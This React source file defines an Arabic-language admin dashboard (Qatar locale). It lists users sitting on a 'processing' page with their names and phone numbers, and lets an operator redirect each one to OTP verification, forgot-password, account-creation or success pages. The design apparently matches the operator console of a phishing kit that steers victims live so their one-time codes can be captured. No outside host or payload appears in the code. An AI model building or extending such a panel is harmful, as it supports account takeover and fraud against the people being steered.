import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";

interface ProcessingUser {
  id: string;
  name: string;
  phone: string;
  timestamp: string;
}

const AdminDashboard = () => {
  const [users, setUsers] = useState<ProcessingUser[]>([]);
  const [selectedRoutes, setSelectedRoutes] = useState<{ [key: string]: string }>({});
  const navigate = useNavigate();

  useEffect(() => {
    // Load users from localStorage
    const loadUsers = () => {
      const storedUsers = localStorage.getItem("processingUsers");
      if (storedUsers) {
        setUsers(JSON.parse(storedUsers));
      }
    };

    loadUsers();
    // Refresh every 5 seconds
    const interval = setInterval(loadUsers, 5000);
    return () => clearInterval(interval);
  }, []);

  const handleRouteSelect = (userId: string, route: string) => {
    setSelectedRoutes(prev => ({ ...prev, [userId]: route }));
  };

  const handleNavigateUser = (userId: string, userName: string) => {
    const route = selectedRoutes[userId];
    if (!route) {
      toast.error("يرجى اختيار الصفحة المراد التوجيه إليها");
      return;
    }

    // Store the navigation instruction for the user
    const navigationInstructions = JSON.parse(localStorage.getItem("navigationInstructions") || "{}");
    navigationInstructions[userId] = route;
    localStorage.setItem("navigationInstructions", JSON.stringify(navigationInstructions));

    toast.success(`تم إرسال أمر التوجيه للمستخدم ${userName}`);
  };

  const handleRemoveUser = (userId: string) => {
    const updatedUsers = users.filter(user => user.id !== userId);
    setUsers(updatedUsers);
    localStorage.setItem("processingUsers", JSON.stringify(updatedUsers));
    
    // Also remove navigation instruction if exists
    const navigationInstructions = JSON.parse(localStorage.getItem("navigationInstructions") || "{}");
    delete navigationInstructions[userId];
    localStorage.setItem("navigationInstructions", JSON.stringify(navigationInstructions));
    
    toast.success("تم حذف المستخدم");
  };

  const routes = [
    { value: "/otp-verification", label: "تحقق OTP" },
    { value: "/forgot-password", label: "نسيت كلمة المرور" },
    { value: "/account-creation", label: "إنشاء حساب" },
    { value: "/success", label: "النجاح" },
  ];

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-br from-gray-50 to-gray-100" dir="rtl">
      <Header />
      
      <main className="flex-1 container mx-auto px-4 py-8">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-2">لوحة تحكم الأدمن</h1>
          <p className="text-gray-600">إدارة المستخدمين في صفحة المعالجة</p>
        </div>

        {users.length === 0 ? (
          <Card className="border-2 border-dashed">
            <CardContent className="flex flex-col items-center justify-center py-12">
              <div className="text-gray-400 text-6xl mb-4">👥</div>
              <p className="text-gray-500 text-lg">لا يوجد مستخدمين حالياً في صفحة المعالجة</p>
            </CardContent>
          </Card>
        ) : (
          <div className="grid gap-4">
            {users.map((user) => (
              <Card key={user.id} className="shadow-sm hover:shadow-md transition-shadow">
                <CardHeader className="pb-3">
                  <CardTitle className="text-lg flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center">
                        <span className="text-primary font-bold">{user.name.charAt(0)}</span>
                      </div>
                      <div>
                        <div className="font-semibold text-gray-900">{user.name}</div>
                        <div className="text-sm text-gray-500 font-normal">{user.phone}</div>
                      </div>
                    </div>
                    <div className="text-xs text-gray-400 font-normal">
                      {new Date(user.timestamp).toLocaleTimeString('ar-QA')}
                    </div>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="flex gap-3">
                    <Select
                      value={selectedRoutes[user.id] || ""}
                      onValueChange={(value) => handleRouteSelect(user.id, value)}
                    >
                      <SelectTrigger className="flex-1">
                        <SelectValue placeholder="اختر الصفحة" />
                      </SelectTrigger>
                      <SelectContent>
                        {routes.map((route) => (
                          <SelectItem key={route.value} value={route.value}>
                            {route.label}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    <Button
                      onClick={() => handleNavigateUser(user.id, user.name)}
                      disabled={!selectedRoutes[user.id]}
                      className="bg-primary hover:bg-primary/90"
                    >
                      توجيه
                    </Button>
                    <Button
                      variant="destructive"
                      onClick={() => handleRemoveUser(user.id)}
                    >
                      حذف
                    </Button>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </main>

      <Footer />
    </div>
  );
};

export default AdminDashboard;
